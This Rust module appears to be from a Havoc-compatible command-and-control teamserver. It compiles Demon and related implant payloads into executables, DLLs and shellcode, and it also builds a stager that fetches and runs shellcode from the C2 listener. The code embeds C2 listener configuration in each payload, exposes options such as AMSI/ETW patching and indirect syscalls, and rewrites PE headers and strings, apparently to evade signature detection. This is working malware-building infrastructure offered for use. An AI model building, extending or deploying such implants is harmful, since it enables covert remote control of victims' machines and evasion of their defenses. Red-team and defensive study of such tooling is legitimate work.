//! Havoc-compatible Demon payload compilation support.

mod build_defs;
mod cache;
mod compiler;
mod config_values;
mod demon_config;
mod formats;
mod rust_agent;
mod toolchain;

use build_defs::{
    build_defines, build_stager_defines, default_compiler_flags, main_args, stager_cache_bytes,
};
pub use cache::PayloadCache;
use cache::compute_cache_key;
pub use compiler::parse_compiler_diagnostic;
use compiler::{asm_sources, c_sources, run_command};
use demon_config::{merged_request_config, pack_config};
use formats::{Architecture, OutputFormat};
pub use toolchain::ToolchainVersion;
use toolchain::{
    GCC_MIN_VERSION, NASM_MIN_VERSION, Toolchain, parse_gcc_version, parse_nasm_version,
    resolve_executable, run_version_command, verify_tool_version_with,
};

use std::ffi::OsString;
use std::path::{Path, PathBuf};
use std::sync::Arc;

use red_cell_common::ListenerConfig;
use red_cell_common::config::{BinaryConfig, DemonConfig, Profile};
use red_cell_common::operator::{BuildPayloadRequestInfo, CompilerDiagnostic};
use serde_json::{Map, Value};
use tempfile::TempDir;
use thiserror::Error;

/// Incremental console output emitted while building a Demon payload.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct BuildProgress {
    /// Havoc-style message severity label.
    pub level: String,
    /// Human-readable build output.
    pub message: String,
}

/// Compiled Demon payload bytes and metadata.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct PayloadArtifact {
    /// Final payload bytes returned to the operator.
    pub bytes: Vec<u8>,
    /// Suggested output filename.
    pub file_name: String,
    /// Echoed output format string.
    pub format: String,
}

/// Errors returned by the Demon payload builder.
#[derive(Debug, Error)]
pub enum PayloadBuildError {
    /// A required compiler, source tree, or template file is unavailable.
    #[error("payload build tooling is unavailable: {message}")]
    ToolchainUnavailable { message: String },
    /// The request payload or selected listener is not supported.
    #[error("invalid payload build request: {message}")]
    InvalidRequest { message: String },
    /// JSON in the operator request could not be parsed.
    #[error("failed to parse payload build configuration: {0}")]
    InvalidConfigJson(#[from] serde_json::Error),
    /// An I/O operation failed while compiling or reading artifacts.
    #[error("payload build I/O failed: {0}")]
    Io(#[from] std::io::Error),
    /// A compiler process exited unsuccessfully.
    #[error("payload build command failed: {command}")]
    CommandFailed {
        command: String,
        /// Structured diagnostics parsed from the compiler's stderr output.
        diagnostics: Vec<CompilerDiagnostic>,
    },
}

/// Teamserver service responsible for compiling Havoc-compatible Demon payloads.
#[derive(Clone, Debug)]
pub struct PayloadBuilderService {
    pub(crate) inner: Arc<PayloadBuilderInner>,
}

/// Per-request agent identity passed through the private build pipeline.
struct AgentBuildContext<'a> {
    /// Lowercase agent name used in output file names (e.g. `"demon"`, `"archon"`).
    name: &'a str,
    /// Root of the agent C/ASM source tree to compile.
    source_root: &'a Path,
}

#[derive(Clone, Debug)]
pub(crate) struct PayloadBuilderInner {
    toolchain: Toolchain,
    source_root: PathBuf,
    /// Source root for the Archon agent fork — points at `agent/archon/`.
    archon_source_root: PathBuf,
    /// Source root for the Phantom Rust agent — points at `agent/phantom/`.
    phantom_source_root: PathBuf,
    /// Source root for the Specter Rust agent — points at `agent/specter/`.
    specter_source_root: PathBuf,
    shellcode_x64_template: PathBuf,
    shellcode_x86_template: PathBuf,
    /// Pre-compiled DllLdr position-independent loader (x64 only).
    /// Prepended to the Demon DLL to produce the Raw Shellcode format.
    dllldr_x64_template: PathBuf,
    /// C source template compiled standalone for the Staged Shellcode format.
    stager_template: PathBuf,
    default_demon: DemonConfig,
    binary_patch: Option<BinaryConfig>,
    pub(crate) cache: PayloadCache,
}

impl PayloadBuilderService {
    /// Resolve the MinGW/NASM toolchain and Havoc payload source tree from `profile`.
    pub fn from_profile(profile: &Profile) -> Result<Self, PayloadBuildError> {
        let repo_root = workspace_root()?;
        Self::from_profile_with_repo_root(profile, &repo_root)
    }

    fn from_profile_with_repo_root(
        profile: &Profile,
        repo_root: &Path,
    ) -> Result<Self, PayloadBuildError> {
        Self::from_profile_with_repo_root_impl(profile, repo_root, run_version_command)
    }

    /// Inner constructor that accepts a custom version-output function so that
    /// tests can avoid subprocess spawns entirely.
    fn from_profile_with_repo_root_impl(
        profile: &Profile,
        repo_root: &Path,
        version_output_fn: fn(&Path) -> Result<String, PayloadBuildError>,
    ) -> Result<Self, PayloadBuildError> {
        let build = profile.teamserver.build.as_ref();

        let compiler_x64 = resolve_executable(
            build.and_then(|config| config.compiler64.as_deref()),
            "x86_64-w64-mingw32-gcc",
            Some(repo_root),
        )?;
        let compiler_x64_version = verify_tool_version_with(
            &compiler_x64,
            parse_gcc_version,
            &GCC_MIN_VERSION,
            version_output_fn,
        )?;

        let compiler_x86 = resolve_executable(
            build.and_then(|config| config.compiler86.as_deref()),
            "i686-w64-mingw32-gcc",
            Some(repo_root),
        )?;
        let compiler_x86_version = verify_tool_version_with(
            &compiler_x86,
            parse_gcc_version,
            &GCC_MIN_VERSION,
            version_output_fn,
        )?;

        let nasm = resolve_executable(
            build.and_then(|config| config.nasm.as_deref()),
            "nasm",
            Some(repo_root),
        )?;
        let nasm_version = verify_tool_version_with(
            &nasm,
            parse_nasm_version,
            &NASM_MIN_VERSION,
            version_output_fn,
        )?;

        tracing::info!(
            compiler_x64 = %compiler_x64.display(),
            compiler_x64_version = %compiler_x64_version,
            compiler_x86 = %compiler_x86.display(),
            compiler_x86_version = %compiler_x86_version,
            nasm = %nasm.display(),
            nasm_version = %nasm_version,
            "payload build toolchain discovered and verified"
        );

        let toolchain = Toolchain {
            compiler_x64,
            compiler_x64_version,
            compiler_x86,
            compiler_x86_version,
            nasm,
            nasm_version,
        };

        let source_root = repo_root.join("agent/demon");
        let archon_source_root = repo_root.join("agent/archon");
        let shellcode_x64_template = repo_root.join("agent/demon/payloads/Shellcode.x64.bin");
        let shellcode_x86_template = repo_root.join("agent/demon/payloads/Shellcode.x86.bin");
        let dllldr_x64_template = repo_root.join("agent/demon/payloads/DllLdr.x64.bin");
        let stager_template = repo_root.join("payloads/templates/MainStager.c");

        for required_path in [
            &source_root,
            &shellcode_x64_template,
            &shellcode_x86_template,
            &dllldr_x64_template,
            &stager_template,
        ] {
            if !required_path.exists() {
                return Err(PayloadBuildError::ToolchainUnavailable {
                    message: format!("required payload asset missing: {}", required_path.display()),
                });
            }
        }

        // Archon/Phantom/Specter source roots are optional at startup — they
        // may not be present on all developer machines.  A missing source tree
        // is only an error when an operator actually requests that agent type.
        let phantom_source_root = repo_root.join("agent/phantom");
        let specter_source_root = repo_root.join("agent/specter");

        let cache = PayloadCache::new(repo_root.join("target/payload-cache"));

        Ok(Self {
            inner: Arc::new(PayloadBuilderInner {
                toolchain,
                source_root,
                archon_source_root,
                phantom_source_root,
                specter_source_root,
                shellcode_x64_template,
                shellcode_x86_template,
                dllldr_x64_template,
                stager_template,
                default_demon: profile.demon.clone(),
                binary_patch: profile.demon.binary.clone(),
                cache,
            }),
        })
    }

    /// Compile a Demon payload for `listener` using the operator `request`.
    ///
    /// If a cached artifact exists for the same inputs, the compilation is
    /// skipped and the cached bytes are returned immediately.
    pub async fn build_payload<F>(
        &self,
        listener: &ListenerConfig,
        request: &BuildPayloadRequestInfo,
        mut progress: F,
    ) -> Result<PayloadArtifact, PayloadBuildError>
    where
        F: FnMut(BuildProgress),
    {
        // Resolve the agent name and source root for this build request.
        let agent_type = request.agent_type.trim();

        // Phantom and Specter are Rust agents with a fundamentally different
        // build pipeline (cargo build instead of C/ASM cross-compilation).
        // Route them to the dedicated Rust-agent builder and return early.
        match agent_type {
            "Phantom" => {
                return self
                    .build_rust_agent(
                        listener,
                        "phantom",
                        &self.inner.phantom_source_root,
                        "x86_64-unknown-linux-gnu",
                        "",
                        &mut progress,
                    )
                    .await;
            }
            "Specter" => {
                return self
                    .build_rust_agent(
                        listener,
                        "specter",
                        &self.inner.specter_source_root,
                        "x86_64-pc-windows-gnu",
                        ".exe",
                        &mut progress,
                    )
                    .await;
            }
            _ => {}
        }

        let (agent_name, source_root) = match agent_type {
            "Demon" => ("demon", &self.inner.source_root),
            "Archon" => {
                if !self.inner.archon_source_root.exists() {
                    return Err(PayloadBuildError::ToolchainUnavailable {
                        message: format!(
                            "Archon source tree not found at {}",
                            self.inner.archon_source_root.display()
                        ),
                    });
                }
                ("archon", &self.inner.archon_source_root)
            }
            other => {
                return Err(PayloadBuildError::InvalidRequest {
                    message: format!("unsupported agent type `{other}`"),
                });
            }
        };

        let architecture = Architecture::parse(&request.arch)?;
        let format = OutputFormat::parse(&request.format)?;

        // The staged shellcode stager does not embed a Demon config — it only
        // needs the C2 connection parameters from the listener.  Route it to a
        // separate fast path that bypasses pack_config entirely.
        if format == OutputFormat::StagedShellcode {
            return self
                .build_staged_payload(listener, architecture, &request.format, &mut progress)
                .await;
        }

        let config = merged_request_config(&request.config, agent_name, &self.inner.default_demon)?;

        // Compute the packed config bytes that will be embedded in the compiled
        // binary. Using these as part of the cache key ensures that any change
        // to the listener or demon configuration produces a distinct cache entry.
        let config_bytes = pack_config(listener, &config)?;
        let cache_key = compute_cache_key(
            agent_name,
            architecture,
            format,
            &config_bytes,
            self.inner.binary_patch.as_ref(),
        )?;

        if let Some(cached) = self.inner.cache.get(&cache_key).await {
            progress(BuildProgress {
                level: "Info".to_owned(),
                message: "cache hit — returning cached artifact".to_owned(),
            });
            let file_name =
                format!("{agent_name}{}{}", architecture.suffix(), format.file_extension());
            return Ok(PayloadArtifact {
                bytes: cached,
                file_name,
                format: request.format.clone(),
            });
        }

        progress(BuildProgress { level: "Info".to_owned(), message: "starting build".to_owned() });

        let temp_dir = TempDir::new()?;
        let agent_ctx = AgentBuildContext { name: agent_name, source_root };
        let compiled = self
            .build_impl(
                listener,
                architecture,
                format,
                &config,
                &agent_ctx,
                temp_dir.path(),
                &mut progress,
            )
            .await?;
        let file_name = format!("{agent_name}{}{}", architecture.suffix(), format.file_extension());

        self.inner.cache.put(&cache_key, &compiled).await;

        Ok(PayloadArtifact { bytes: compiled, file_name, format: request.format.clone() })
    }

    /// Return a reference to the payload artifact cache.
    pub fn cache(&self) -> &PayloadCache {
        &self.inner.cache
    }

    #[doc(hidden)]
    pub fn disabled_for_tests() -> Self {
        let root = Path::new(env!("CARGO_MANIFEST_DIR")).join("..");
        let unknown_version =
            ToolchainVersion { major: 0, minor: 0, patch: 0, raw: "0.0.0".to_owned() };
        Self {
            inner: Arc::new(PayloadBuilderInner {
                toolchain: Toolchain {
                    compiler_x64: PathBuf::from("/nonexistent/x64-gcc"),
                    compiler_x64_version: unknown_version.clone(),
                    compiler_x86: PathBuf::from("/nonexistent/x86-gcc"),
                    compiler_x86_version: unknown_version.clone(),
                    nasm: PathBuf::from("/nonexistent/nasm"),
                    nasm_version: unknown_version,
                },
                source_root: root.join("agent/demon"),
                archon_source_root: PathBuf::from("/nonexistent/agent/archon"),
                phantom_source_root: PathBuf::from("/nonexistent/agent/phantom"),
                specter_source_root: PathBuf::from("/nonexistent/agent/specter"),
                shellcode_x64_template: root.join("agent/demon/payloads/Shellcode.x64.bin"),
                shellcode_x86_template: root.join("agent/demon/payloads/Shellcode.x86.bin"),
                dllldr_x64_template: root.join("agent/demon/payloads/DllLdr.x64.bin"),
                stager_template: root.join("payloads/templates/MainStager.c"),
                default_demon: DemonConfig {
                    sleep: None,
                    jitter: None,
                    indirect_syscall: false,
                    stack_duplication: false,
                    sleep_technique: None,
                    proxy_loading: None,
                    amsi_etw_patching: None,
                    injection: None,
                    dotnet_name_pipe: None,
                    binary: None,
                    init_secret: None,
                    init_secrets: Vec::new(),
                    trust_x_forwarded_for: false,
                    trusted_proxy_peers: Vec::new(),
                    heap_enc: true,
                    allow_legacy_ctr: false,
                },
                binary_patch: None,
                cache: PayloadCache::new(PathBuf::from("/nonexistent/payload-cache")),
            }),
        }
    }

    #[cfg(test)]
    #[allow(clippy::too_many_arguments)]
    fn with_paths_for_tests(
        toolchain: Toolchain,
        source_root: PathBuf,
        archon_source_root: PathBuf,
        shellcode_x64_template: PathBuf,
        shellcode_x86_template: PathBuf,
        dllldr_x64_template: PathBuf,
        stager_template: PathBuf,
        default_demon: DemonConfig,
        binary_patch: Option<BinaryConfig>,
        cache_dir: PathBuf,
    ) -> Self {
        Self {
            inner: Arc::new(PayloadBuilderInner {
                toolchain,
                source_root,
                archon_source_root,
                phantom_source_root: PathBuf::from("/nonexistent/agent/phantom"),
                specter_source_root: PathBuf::from("/nonexistent/agent/specter"),
                shellcode_x64_template,
                shellcode_x86_template,
                dllldr_x64_template,
                stager_template,
                default_demon,
                binary_patch,
                cache: PayloadCache::new(cache_dir),
            }),
        }
    }

    async fn build_impl<F>(
        &self,
        listener: &ListenerConfig,
        architecture: Architecture,
        format: OutputFormat,
        config: &Map<String, Value>,
        agent: &AgentBuildContext<'_>,
        compile_dir: &Path,
        progress: &mut F,
    ) -> Result<Vec<u8>, PayloadBuildError>
    where
        F: FnMut(BuildProgress),
    {
        if format == OutputFormat::Shellcode {
            progress(BuildProgress {
                level: "Info".to_owned(),
                message: "compiling core dll".to_owned(),
            });
            let dll_bytes = self
                .compile_portable_executable(
                    listener,
                    architecture,
                    OutputFormat::Dll,
                    config,
                    agent,
                    compile_dir,
                    true,
                    progress,
                )
                .await?;
            let template = tokio::fs::read(match architecture {
                Architecture::X64 => &self.inner.shellcode_x64_template,
                Architecture::X86 => &self.inner.shellcode_x86_template,
            })
            .await?;

            progress(BuildProgress {
                level: "Info".to_owned(),
                message: format!("compiled core dll [{} bytes]", dll_bytes.len()),
            });

            let mut shellcode = template;
            shellcode.extend_from_slice(&dll_bytes);
            progress(BuildProgress {
                level: "Info".to_owned(),
                message: format!("shellcode payload [{} bytes]", shellcode.len()),
            });
            progress(BuildProgress {
                level: "Good".to_owned(),
                message: "payload generated".to_owned(),
            });
            return Ok(shellcode);
        }

        if format == OutputFormat::RawShellcode {
            if architecture == Architecture::X86 {
                return Err(PayloadBuildError::InvalidRequest {
                    message:
                        "Windows Raw Shellcode requires x64 architecture: no x86 DllLdr binary \
                         is available"
                            .to_owned(),
                });
            }
            progress(BuildProgress {
                level: "Info".to_owned(),
                message: "compiling core dll for raw shellcode".to_owned(),
            });
            let dll_bytes = self
                .compile_portable_executable(
                    listener,
                    architecture,
                    OutputFormat::Dll,
                    config,
                    agent,
                    compile_dir,
                    true,
                    progress,
                )
                .await?;
            let template = tokio::fs::read(&self.inner.dllldr_x64_template).await?;

            progress(BuildProgress {
                level: "Info".to_owned(),
                message: format!("compiled core dll [{} bytes]", dll_bytes.len()),
            });

            let mut shellcode = template;
            shellcode.extend_from_slice(&dll_bytes);
            progress(BuildProgress {
                level: "Info".to_owned(),
                message: format!("raw shellcode payload [{} bytes]", shellcode.len()),
            });
            progress(BuildProgress {
                level: "Good".to_owned(),
                message: "payload generated".to_owned(),
            });
            return Ok(shellcode);
        }

        let bytes = self
            .compile_portable_executable(
                listener,
                architecture,
                format,
                config,
                agent,
                compile_dir,
                false,
                progress,
            )
            .await?;
        progress(BuildProgress {
            level: "Good".to_owned(),
            message: "payload generated".to_owned(),
        });
        Ok(bytes)
    }

    #[allow(clippy::too_many_arguments)]
    async fn compile_portable_executable<F>(
        &self,
        listener: &ListenerConfig,
        architecture: Architecture,
        format: OutputFormat,
        config: &Map<String, Value>,
        agent: &AgentBuildContext<'_>,
        compile_dir: &Path,
        shellcode_define: bool,
        progress: &mut F,
    ) -> Result<Vec<u8>, PayloadBuildError>
    where
        F: FnMut(BuildProgress),
    {
        let config_bytes = pack_config(listener, config)?;
        progress(BuildProgress {
            level: "Info".to_owned(),
            message: format!("config size [{} bytes]", config_bytes.len()),
        });

        let output_path = compile_dir.join(format!(
            "{}{}{}",
            agent.name,
            architecture.suffix(),
            format.file_extension()
        ));
        let defines = build_defines(listener, config_bytes.as_slice(), shellcode_define)?;
        let object_files = self
            .compile_asm_objects(architecture, agent.source_root, compile_dir, progress)
            .await?;
        let compiler = match architecture {
            Architecture::X64 => &self.inner.toolchain.compiler_x64,
            Architecture::X86 => &self.inner.toolchain.compiler_x86,
        };

        let mut args: Vec<OsString> = Vec::new();
        args.extend(object_files.into_iter().map(|path| path.into_os_string()));
        for path in c_sources(agent.source_root)? {
            args.push(
                path.strip_prefix(agent.source_root)
                    .map_err(|source| PayloadBuildError::ToolchainUnavailable {
                        message: format!(
                            "failed to relativize source path {}: {source}",
                            path.display()
                        ),
                    })?
                    .as_os_str()
                    .to_os_string(),
            );
        }
        args.push(OsString::from("src/Demon.c"));
        args.push(OsString::from("-Iinclude"));
        args.extend(default_compiler_flags(format).into_iter().map(OsString::from));
        args.extend(defines.into_iter().map(|define| OsString::from(format!("-D{define}"))));
        args.extend(main_args(architecture, format).into_iter().map(OsString::from));
        args.push(OsString::from("-o"));
        args.push(output_path.as_os_str().to_os_string());

        progress(BuildProgress {
            level: "Info".to_owned(),
            message: "compiling source".to_owned(),
        });
        run_command(compiler, &args, agent.source_root, progress).await?;
        progress(BuildProgress {
            level: "Info".to_owned(),
            message: "finished compiling source".to_owned(),
        });

        let mut payload = tokio::fs::read(&output_path).await?;
        if let Some(binary_patch) = &self.inner.binary_patch {
            payload = patch_payload(payload, architecture, binary_patch)?;
        }
        Ok(payload)
    }

    async fn compile_asm_objects<F>(
        &self,
        architecture: Architecture,
        source_root: &Path,
        compile_dir: &Path,
        progress: &mut F,
    ) -> Result<Vec<PathBuf>, PayloadBuildError>
    where
        F: FnMut(BuildProgress),
    {
        let mut objects = Vec::new();

        for source in asm_sources(source_root, architecture)? {
            let file_stem =
                source.file_stem().and_then(|value| value.to_str()).ok_or_else(|| {
                    PayloadBuildError::ToolchainUnavailable {
                        message: format!("invalid assembly source file name {}", source.display()),
                    }
                })?;
            let object_path = compile_dir.join(format!("{file_stem}.o"));
            let relative = source.strip_prefix(source_root).map_err(|error| {
                PayloadBuildError::ToolchainUnavailable {
                    message: format!(
                        "failed to relativize assembly source {}: {error}",
                        source.display()
                    ),
                }
            })?;

            run_command(
                &self.inner.toolchain.nasm,
                &[
                    OsString::from("-f"),
                    OsString::from(architecture.nasm_format()),
                    relative.as_os_str().to_os_string(),
                    OsString::from("-o"),
                    object_path.as_os_str().to_os_string(),
                ],
                source_root,
                progress,
            )
            .await?;
            objects.push(object_path);
        }

        Ok(objects)
    }

    /// Build path for the staged shellcode format.
    ///
    /// The stager does not embed a Demon config — it only needs the C2
    /// connection parameters.  The cache key is derived from the listener
    /// connection info so that re-builds with the same listener are cached.
    async fn build_staged_payload<F>(
        &self,
        listener: &ListenerConfig,
        architecture: Architecture,
        format_str: &str,
        progress: &mut F,
    ) -> Result<PayloadArtifact, PayloadBuildError>
    where
        F: FnMut(BuildProgress),
    {
        let stager_key_bytes = stager_cache_bytes(listener)?;
        // Staged shellcode stagers are always built from the Demon source tree.
        let cache_key = compute_cache_key(
            "demon",
            architecture,
            OutputFormat::StagedShellcode,
            &stager_key_bytes,
            None,
        )?;

        if let Some(cached) = self.inner.cache.get(&cache_key).await {
            progress(BuildProgress {
                level: "Info".to_owned(),
                message: "cache hit — returning cached artifact".to_owned(),
            });
            let file_name = format!(
                "demon{}{}",
                architecture.suffix(),
                OutputFormat::StagedShellcode.file_extension()
            );
            return Ok(PayloadArtifact { bytes: cached, file_name, format: format_str.to_owned() });
        }

        progress(BuildProgress {
            level: "Info".to_owned(),
            message: "starting stager build".to_owned(),
        });

        let temp_dir = TempDir::new()?;
        let compiled =
            self.compile_stager(listener, architecture, temp_dir.path(), progress).await?;
        let file_name = format!(
            "demon{}{}",
            architecture.suffix(),
            OutputFormat::StagedShellcode.file_extension()
        );

        self.inner.cache.put(&cache_key, &compiled).await;

        Ok(PayloadArtifact { bytes: compiled, file_name, format: format_str.to_owned() })
    }

    /// Compile the staged shellcode stager from `payloads/templates/MainStager.c`.
    ///
    /// The stager is a standalone Windows EXE that downloads the Demon
    /// shellcode payload from the C2 listener at run time and executes it.
    /// It is compiled without the Demon source tree.
    async fn compile_stager<F>(
        &self,
        listener: &ListenerConfig,
        architecture: Architecture,
        compile_dir: &Path,
        progress: &mut F,
    ) -> Result<Vec<u8>, PayloadBuildError>
    where
        F: FnMut(BuildProgress),
    {
        let template_dst = compile_dir.join("MainStager.c");
        tokio::fs::copy(&self.inner.stager_template, &template_dst).await?;

        let defines = build_stager_defines(listener)?;

        let output_path = compile_dir.join(format!(
            "stager{}{}",
            architecture.suffix(),
            OutputFormat::StagedShellcode.file_extension()
        ));

        let compiler = match architecture {
            Architecture::X64 => &self.inner.toolchain.compiler_x64,
            Architecture::X86 => &self.inner.toolchain.compiler_x86,
        };

        let entry = if architecture == Architecture::X64 { "WinMain" } else { "_WinMain" };

        let mut args: Vec<OsString> = vec![
            OsString::from("MainStager.c"),
            OsString::from("-Os"),
            OsString::from("-s"),
            OsString::from("-mwindows"),
            OsString::from("-lwininet"),
            OsString::from("-Wl,--gc-sections"),
        ];
        args.extend(defines.into_iter().map(|d| OsString::from(format!("-D{d}"))));
        args.push(OsString::from("-e"));
        args.push(OsString::from(entry));
        args.push(OsString::from("-o"));
        args.push(output_path.as_os_str().to_os_string());

        progress(BuildProgress {
            level: "Info".to_owned(),
            message: "compiling stager".to_owned(),
        });
        run_command(compiler, &args, compile_dir, progress).await?;
        progress(BuildProgress {
            level: "Good".to_owned(),
            message: "payload generated".to_owned(),
        });

        Ok(tokio::fs::read(&output_path).await?)
    }
}

pub(crate) fn workspace_root() -> Result<PathBuf, PayloadBuildError> {
    let manifest_dir = Path::new(env!("CARGO_MANIFEST_DIR"));
    let workspace_root =
        manifest_dir.parent().ok_or_else(|| PayloadBuildError::ToolchainUnavailable {
            message: format!(
                "failed to resolve repository root: manifest directory `{}` has no parent",
                manifest_dir.display()
            ),
        })?;
    workspace_root.canonicalize().map_err(|source| PayloadBuildError::ToolchainUnavailable {
        message: format!("failed to resolve repository root: {source}"),
    })
}

fn patch_payload(
    mut bytes: Vec<u8>,
    architecture: Architecture,
    binary_patch: &BinaryConfig,
) -> Result<Vec<u8>, PayloadBuildError> {
    // Validate PE structure before applying any patches.  A failed build step
    // may produce an ELF, error output, or a truncated file; writing PE header
    // fields into such a binary would silently corrupt it with no diagnostic.
    const MZ_MAGIC: [u8; 2] = [0x4D, 0x5A];
    if bytes.len() < 2 || bytes[..2] != MZ_MAGIC {
        return Err(PayloadBuildError::InvalidRequest {
            message: "payload does not start with MZ magic bytes — not a valid PE binary"
                .to_owned(),
        });
    }
    // pe_offsets validates the PE\0\0 signature at the DOS header pointer (0x3C).
    pe_offsets(&bytes)?;

    let header = binary_patch.header.as_ref();
    let magic = match architecture {
        Architecture::X64 => header.and_then(|header| header.magic_mz_x64.as_deref()),
        Architecture::X86 => header.and_then(|header| header.magic_mz_x86.as_deref()),
    };
    if let Some(magic) = magic {
        let patch = magic.as_bytes();
        if patch.len() > bytes.len() {
            return Err(PayloadBuildError::InvalidRequest {
                message: "binary patch header is larger than the payload".to_owned(),
            });
        }
        bytes[..patch.len()].copy_from_slice(patch);
    }

    if let Some(header) = &binary_patch.header {
        if let Some(compile_time) = header.compile_time.as_deref() {
            let timestamp = parse_header_u32_field("CompileTime", compile_time)?;
            write_pe_file_header_timestamp(&mut bytes, timestamp)?;
        }

        let image_size = match architecture {
            Architecture::X64 => header.image_size_x64,
            Architecture::X86 => header.image_size_x86,
        };
        if let Some(image_size) = image_size {
            write_pe_optional_header_image_size(&mut bytes, image_size)?;
        }
    }

    let replacements = match architecture {
        Architecture::X64 => &binary_patch.replace_strings_x64,
        Architecture::X86 => &binary_patch.replace_strings_x86,
    };
    for (old, new) in replacements {
        let mut replacement = new.as_bytes().to_vec();
        if replacement.len() > old.len() {
            return Err(PayloadBuildError::InvalidRequest {
                message: format!("replacement value `{new}` is longer than search string `{old}`"),
            });
        }
        replacement.resize(old.len(), 0);
        bytes = replace_all(bytes, old.as_bytes(), &replacement);
    }

    Ok(bytes)
}

fn parse_header_u32_field(field_name: &str, value: &str) -> Result<u32, PayloadBuildError> {
    let trimmed = value.trim();
    let parsed =
        if let Some(hex) = trimmed.strip_prefix("0x").or_else(|| trimmed.strip_prefix("0X")) {
            u32::from_str_radix(hex, 16)
        } else {
            trimmed.parse::<u32>()
        };

    parsed.map_err(|_| PayloadBuildError::InvalidRequest {
        message: format!("{field_name} `{trimmed}` must be a valid u32 value"),
    })
}

fn pe_offsets(bytes: &[u8]) -> Result<(usize, usize), PayloadBuildError> {
    const DOS_HEADER_PE_POINTER_OFFSET: usize = 0x3C;
    const PE_SIGNATURE_SIZE: usize = 4;
    const FILE_HEADER_SIZE: usize = 20;

    if bytes.len() < DOS_HEADER_PE_POINTER_OFFSET + 4 {
        return Err(PayloadBuildError::InvalidRequest {
            message: "payload is too small to contain a PE header".to_owned(),
        });
    }

    let pe_offset = u32::from_le_bytes(
        bytes[DOS_HEADER_PE_POINTER_OFFSET..DOS_HEADER_PE_POINTER_OFFSET + 4].try_into().map_err(
            |_| PayloadBuildError::InvalidRequest {
                message: "payload is too small to contain a PE header".to_owned(),
            },
        )?,
    );
    let pe_offset = usize::try_from(pe_offset).map_err(|_| PayloadBuildError::InvalidRequest {
        message: "payload PE header offset does not fit in memory".to_owned(),
    })?;

    if bytes.len() < pe_offset + PE_SIGNATURE_SIZE + FILE_HEADER_SIZE {
        return Err(PayloadBuildError::InvalidRequest {
            message: "payload PE header is truncated".to_owned(),
        });
    }

    if bytes[pe_offset..pe_offset + PE_SIGNATURE_SIZE] != *b"PE\0\0" {
        return Err(PayloadBuildError::InvalidRequest {
            message: "payload does not contain a valid PE signature".to_owned(),
        });
    }

    let optional_header_offset = pe_offset + PE_SIGNATURE_SIZE + FILE_HEADER_SIZE;
    if bytes.len() < optional_header_offset + 60 {
        return Err(PayloadBuildError::InvalidRequest {
            message: "payload PE optional header is truncated".to_owned(),
        });
    }

    Ok((pe_offset, optional_header_offset))
}

fn write_pe_file_header_timestamp(
    bytes: &mut [u8],
    timestamp: u32,
) -> Result<(), PayloadBuildError> {
    let (pe_offset, _) = pe_offsets(bytes)?;
    let timestamp_offset = pe_offset + 8;
    bytes[timestamp_offset..timestamp_offset + 4].copy_from_slice(&timestamp.to_le_bytes());
    Ok(())
}

fn write_pe_optional_header_image_size(
    bytes: &mut [u8],
    image_size: u32,
) -> Result<(), PayloadBuildError> {
    let (_, optional_header_offset) = pe_offsets(bytes)?;
    let image_size_offset = optional_header_offset + 56;
    bytes[image_size_offset..image_size_offset + 4].copy_from_slice(&image_size.to_le_bytes());
    Ok(())
}

fn replace_all(mut haystack: Vec<u8>, needle: &[u8], replacement: &[u8]) -> Vec<u8> {
    if needle.is_empty() {
        return haystack;
    }

    let mut offset = 0;
    while let Some(position) =
        haystack[offset..].windows(needle.len()).position(|window| window == needle)
    {
        let start = offset + position;
        haystack[start..start + needle.len()].copy_from_slice(replacement);
        offset = start + replacement.len();
    }
    haystack
}

#[cfg(test)]
mod tests;
